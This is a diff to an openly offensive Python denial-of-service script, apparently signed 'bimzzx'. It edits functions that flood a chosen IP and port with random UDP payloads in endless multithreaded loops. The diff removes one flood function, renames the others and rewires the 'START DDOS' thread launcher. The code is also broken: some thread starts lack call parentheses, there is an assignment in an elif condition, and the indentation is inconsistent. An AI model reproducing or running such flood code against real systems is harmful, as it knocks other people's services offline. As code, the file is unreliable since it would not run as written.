@@ -48,19 +48,6 @@ def attack2():
 			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
 
 def attack3():
-	data = random._urandom(1080)
-	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
-		except:
-			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
-
-def attack4():
 	data = random._urandom(999)
 	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
 	while True:
@@ -73,7 +60,7 @@ def attack4():
 		except:
 			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
 
-def attack5():
+def attack4():
 	data = random._urandom(818)
 	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
 	while True:
@@ -90,15 +77,13 @@ def attack5():
 # START DDOS
 for y in range(threads):
 	if choice == 'y':
-		th = threading.Thread(target = ddos)
+		th = threading.Thread(target = attack)
 		th.start()
 		th = threading.Thread(target = attack2)
 		th.start()
 		th = threading.Thread(target = attack3)
 		th.start
 		th = threading.Thread(target = attack4)
-	    th.start
-	    th = threading.Thread(target = attack5)
 		th.start
 	elif choice = 'n':
 		print("\033[91m[ Bimzzx ] • CloseTheProgram")
